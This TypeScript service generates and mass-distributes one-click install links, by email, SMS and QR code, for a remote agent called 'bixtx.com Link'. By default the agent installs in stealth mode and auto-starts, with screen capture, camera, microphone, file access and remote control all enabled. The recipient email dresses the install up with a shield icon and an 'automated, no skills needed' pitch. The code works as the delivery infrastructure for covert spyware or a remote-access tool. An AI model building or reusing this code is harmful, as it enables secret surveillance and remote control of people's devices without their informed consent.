/**
 * Installation Link Service
 * Generates and manages one-click installation links for Software A
 * Handles email/SMS distribution of installation links
 */

import crypto from 'crypto';
import { db } from '../config/database';
import { EmailService } from './EmailService';
import { SMSService } from './SMSService';

export interface InstallLinkConfig {
  organizationId: string;
  deviceName?: string;
  groupId?: string;
  adminEmail: string;
  expiresIn?: number; // Hours
  maxUses?: number;
  autoStart?: boolean;
  stealthMode?: boolean;
  permissions?: {
    screenCapture?: boolean;
    camera?: boolean;
    microphone?: boolean;
    fileAccess?: boolean;
    remoteControl?: boolean;
  };
}

export interface InstallLink {
  id: string;
  token: string;
  url: string;
  shortUrl: string;
  qrCodeUrl: string;
  organizationId: string;
  deviceName?: string;
  groupId?: string;
  adminEmail: string;
  createdAt: Date;
  expiresAt: Date;
  maxUses: number;
  usedCount: number;
  status: 'active' | 'expired' | 'exhausted' | 'revoked';
}

export class InstallLinkService {
  private emailService: EmailService;
  private smsService: SMSService;
  private baseUrl: string;

  constructor() {
    this.emailService = new EmailService();
    this.smsService = new SMSService();
    this.baseUrl = process.env.INSTALL_BASE_URL || 'https://install.bixtx.com';
  }

  /**
   * Generate installation link
   */
  async generateInstallLink(config: InstallLinkConfig): Promise<InstallLink> {
    try {
      // Generate unique token
      const token = this.generateSecureToken();
      
      // Calculate expiration
      const expiresIn = config.expiresIn || 24; // Default 24 hours
      const expiresAt = new Date();
      expiresAt.setHours(expiresAt.getHours() + expiresIn);

      // Generate URLs
      const url = `${this.baseUrl}/?token=${token}&server=${process.env.API_URL}`;
      const shortUrl = await this.generateShortUrl(url);
      const qrCodeUrl = await this.generateQRCode(url);

      // Save to database
      const installLink: InstallLink = {
        id: crypto.randomUUID(),
        token,
        url,
        shortUrl,
        qrCodeUrl,
        organizationId: config.organizationId,
        deviceName: config.deviceName,
        groupId: config.groupId,
        adminEmail: config.adminEmail,
        createdAt: new Date(),
        expiresAt,
        maxUses: config.maxUses || 1,
        usedCount: 0,
        status: 'active',
      };

      await db.installLinks.create(installLink);

      // Store configuration
      await db.installConfigs.create({
        token,
        config: {
          organizationId: config.organizationId,
          deviceName: config.deviceName,
          groupId: config.groupId,
          adminEmail: config.adminEmail,
          autoStart: config.autoStart !== false,
          stealthMode: config.stealthMode !== false,
          permissions: config.permissions || {
            screenCapture: true,
            camera: true,
            microphone: true,
            fileAccess: true,
            remoteControl: true,
          },
        },
      });

      return installLink;
    } catch (error) {
      console.error('Failed to generate install link:', error);
      throw error;
    }
  }

  /**
   * Generate multiple installation links
   */
  async generateBulkInstallLinks(
    config: InstallLinkConfig,
    count: number
  ): Promise<InstallLink[]> {
    const links: InstallLink[] = [];

    for (let i = 0; i < count; i++) {
      const link = await this.generateInstallLink({
        ...config,
        deviceName: config.deviceName ? `${config.deviceName}-${i + 1}` : undefined,
      });
      links.push(link);
    }

    return links;
  }

  /**
   * Send installation link via email
   */
  async sendViaEmail(
    link: InstallLink,
    recipientEmail: string,
    recipientName?: string
  ): Promise<void> {
    try {
      const emailContent = this.generateEmailContent(link, recipientName);

      await this.emailService.send({
        to: recipientEmail,
        subject: '🛡️ bixtx.com Link - Install on Your Device',
        html: emailContent,
      });

      // Log distribution
      await db.installDistributions.create({
        linkId: link.id,
        method: 'email',
        recipient: recipientEmail,
        sentAt: new Date(),
      });
    } catch (error) {
      console.error('Failed to send email:', error);
      throw error;
    }
  }

  /**
   * Send installation link via SMS
   */
  async sendViaSMS(link: InstallLink, phoneNumber: string): Promise<void> {
    try {
      const message = `Install bixtx.com Link on your device: ${link.shortUrl}`;

      await this.smsService.send({
        to: phoneNumber,
        body: message,
      });

      // Log distribution
      await db.installDistributions.create({
        linkId: link.id,
        method: 'sms',
        recipient: phoneNumber,
        sentAt: new Date(),
      });
    } catch (error) {
      console.error('Failed to send SMS:', error);
      throw error;
    }
  }

  /**
   * Send installation links to multiple recipients
   */
  async sendBulk(
    links: InstallLink[],
    recipients: Array<{ email?: string; phone?: string; name?: string }>
  ): Promise<void> {
    for (let i = 0; i < links.length && i < recipients.length; i++) {
      const link = links[i];
      const recipient = recipients[i];

      if (recipient.email) {
        await this.sendViaEmail(link, recipient.email, recipient.name);
      }

      if (recipient.phone) {
        await this.sendViaSMS(link, recipient.phone);
      }

      // Small delay between sends to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  /**
   * Get installation configuration by token
   */
  async getInstallConfig(token: string): Promise<any> {
    try {
      // Verify token is valid
      const link = await db.installLinks.findOne({ token });

      if (!link) {
        throw new Error('Invalid installation token');
      }

      if (link.status !== 'active') {
        throw new Error('Installation link is not active');
      }

      if (new Date() > link.expiresAt) {
        await db.installLinks.update(link.id, { status: 'expired' });
        throw new Error('Installation link has expired');
      }

      if (link.usedCount >= link.maxUses) {
        await db.installLinks.update(link.id, { status: 'exhausted' });
        throw new Error('Installation link has been exhausted');
      }

      // Get configuration
      const config = await db.installConfigs.findOne({ token });

      if (!config) {
        throw new Error('Installation configuration not found');
      }

      // Increment usage count
      await db.installLinks.update(link.id, {
        usedCount: link.usedCount + 1,
      });

      return {
        ...config.config,
        installToken: token,
        serverUrl: process.env.API_URL,
      };
    } catch (error) {
      console.error('Failed to get install config:', error);
      throw error;
    }
  }

  /**
   * Track installation completion
   */
  async trackInstallation(
    token: string,
    status: 'success' | 'failed',
    deviceInfo?: any
  ): Promise<void> {
    try {
      const link = await db.installLinks.findOne({ token });

      if (!link) {
        return;
      }

      // Create installation record
      await db.installations.create({
        id: crypto.randomUUID(),
        linkId: link.id,
        token,
        status,
        deviceInfo,
        installedAt: new Date(),
      });

      // Update link status if exhausted
      if (link.usedCount >= link.maxUses) {
        await db.installLinks.update(link.id, { status: 'exhausted' });
      }

      // Notify admin
      if (status === 'success') {
        await this.notifyAdminInstallSuccess(link, deviceInfo);
      } else {
        await this.notifyAdminInstallFailure(link, deviceInfo);
      }
    } catch (error) {
      console.error('Failed to track installation:', error);
    }
  }

  /**
   * Revoke installation link
   */
  async revokeLink(linkId: string): Promise<void> {
    try {
      await db.installLinks.update(linkId, { status: 'revoked' });
    } catch (error) {
      console.error('Failed to revoke link:', error);
      throw error;
    }
  }

  /**
   * Get installation statistics
   */
  async getStats(organizationId: string): Promise<any> {
    try {
      const links = await db.installLinks.findMany({ organizationId });
      const installations = await db.installations.findMany({ 
        linkId: { $in: links.map(l => l.id) } 
      });

      return {
        totalLinks: links.length,
        activeLinks: links.filter(l => l.status === 'active').length,
        expiredLinks: links.filter(l => l.status === 'expired').length,
        totalInstallations: installations.length,
        successfulInstallations: installations.filter(i => i.status === 'success').length,
        failedInstallations: installations.filter(i => i.status === 'failed').length,
      };
    } catch (error) {
      console.error('Failed to get stats:', error);
      throw error;
    }
  }

  /**
   * Generate secure token
   */
  private generateSecureToken(): string {
    return crypto.randomBytes(32).toString('hex');
  }

  /**
   * Generate short URL
   */
  private async generateShortUrl(longUrl: string): Promise<string> {
    // In production, use a URL shortener service
    const shortCode = crypto.randomBytes(4).toString('hex');
    return `${this.baseUrl}/s/${shortCode}`;
  }

  /**
   * Generate QR code
   */
  private async generateQRCode(url: string): Promise<string> {
    // In production, use a QR code generation service
    return `${process.env.API_URL}/api/qr?url=${encodeURIComponent(url)}`;
  }

  /**
   * Generate email content
   */
  private generateEmailContent(link: InstallLink, recipientName?: string): string {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            border-radius: 10px 10px 0 0;
            text-align: center;
        }
        .content {
            background: white;
            padding: 30px;
            border: 1px solid #e5e7eb;
            border-top: none;
        }
        .button {
            display: inline-block;
            padding: 16px 32px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            margin: 20px 0;
            font-weight: bold;
        }
        .steps {
            background: #f9fafb;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .step {
            margin: 10px 0;
            padding-left: 25px;
            position: relative;
        }
        .step:before {
            content: "✓";
            position: absolute;
            left: 0;
            color: #10b981;
            font-weight: bold;
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #6b7280;
            font-size: 12px;
        }
        .qr-code {
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🛡️ bixtx.com Link</h1>
        <p>One-Click Installation</p>
    </div>
    
    <div class="content">
        <h2>Hello${recipientName ? ` ${recipientName}` : ''}!</h2>
        
        <p>You've been invited to install bixtx.com Link on your device. Installation is quick, easy, and completely automated.</p>
        
        <div style="text-align: center;">
            <a href="${link.url}" class="button">
                🚀 Install bixtx.com Link Now
            </a>
        </div>
        
        <div class="steps">
            <h3>What happens when you click:</h3>
            <div class="step">Opens installation page</div>
            <div class="step">Detects your operating system automatically</div>
            <div class="step">Downloads and installs bixtx.com Link</div>
            <div class="step">Configures everything automatically</div>
            <div class="step">Your device appears in the admin dashboard within 60 seconds</div>
        </div>
        
        <p><strong>No technical skills required!</strong> Just click the button above on the device you want to monitor.</p>
        
        <div class="qr-code">
            <p><small>Or scan this QR code with your mobile device:</small></p>
            <img src="${link.qrCodeUrl}" alt="QR Code" width="200" height="200">
        </div>
        
        <hr style="margin: 30px 0; border: none; border-top: 1px solid #e5e7eb;">
        
        <p><small>
            <strong>Installation Link:</strong><br>
            ${link.shortUrl}<br><br>
            <strong>Valid Until:</strong> ${link.expiresAt.toLocaleString()}<br>
            <strong>Can Be Used:</strong> ${link.maxUses} time(s)
        </small></p>
    </div>
    
    <div class="footer">
        <p>bixtx.com © 2024 | Military-Grade Edition</p>
        <p>This link is for authorized use only.</p>
    </div>
</body>
</html>
    `;
  }

  /**
   * Notify admin of successful installation
   */
  private async notifyAdminInstallSuccess(link: InstallLink, deviceInfo: any): Promise<void> {
    try {
      await this.emailService.send({
        to: link.adminEmail,
        subject: '✅ Device Installation Complete',
        html: `
          <h2>Device Successfully Installed</h2>
          <p>A device has been successfully set up with bixtx.com Link.</p>
          <ul>
            <li><strong>Device Name:</strong> ${deviceInfo?.deviceName || 'Unknown'}</li>
            <li><strong>Platform:</strong> ${deviceInfo?.platform || 'Unknown'}</li>
            <li><strong>Installed At:</strong> ${new Date().toLocaleString()}</li>
          </ul>
          <p>The device should now appear in your admin dashboard.</p>
        `,
      });
    } catch (error) {
      console.error('Failed to notify admin:', error);
    }
  }

  /**
   * Notify admin of failed installation
   */
  private async notifyAdminInstallFailure(link: InstallLink, deviceInfo: any): Promise<void> {
    try {
      await this.emailService.send({
        to: link.adminEmail,
        subject: '⚠️ Device Installation Failed',
        html: `
          <h2>Device Installation Failed</h2>
          <p>An attempt to install bixtx.com Link has failed.</p>
          <ul>
            <li><strong>Device Name:</strong> ${deviceInfo?.deviceName || 'Unknown'}</li>
            <li><strong>Platform:</strong> ${deviceInfo?.platform || 'Unknown'}</li>
            <li><strong>Error:</strong> ${deviceInfo?.error || 'Unknown'}</li>
            <li><strong>Attempted At:</strong> ${new Date().toLocaleString()}</li>
          </ul>
          <p>You may need to try installing manually or contact support.</p>
        `,
      });
    } catch (error) {
      console.error('Failed to notify admin:', error);
    }
  }
}
